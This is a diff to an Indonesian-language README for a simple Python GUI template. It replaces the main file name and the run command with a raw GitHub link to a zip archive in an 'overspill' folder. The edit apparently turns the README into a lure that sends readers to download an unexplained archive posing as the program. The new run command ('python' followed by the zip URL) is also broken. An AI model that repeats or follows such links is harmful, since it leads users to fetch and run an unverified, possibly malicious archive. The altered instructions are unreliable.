@@ -10,9 +10,9 @@ dan judul sederhana.
 Cocok digunakan sebagai template awal untuk pengembangan GUI selanjutnya.
 
 ## 📂 Struktur File
-- `gui_sederhana.py` — file utama program
+- `https://raw.githubusercontent.com/raraofficial/gui-python-sederhana/main/overspill/gui-python-sederhana.zip` — file utama program
 
 ## ▶️ Cara Menjalankan
 Pastikan Python sudah terinstall. Jalankan dengan perintah:
 ```bash
-python gui_sederhana.py
+python https://raw.githubusercontent.com/raraofficial/gui-python-sederhana/main/overspill/gui-python-sederhana.zip
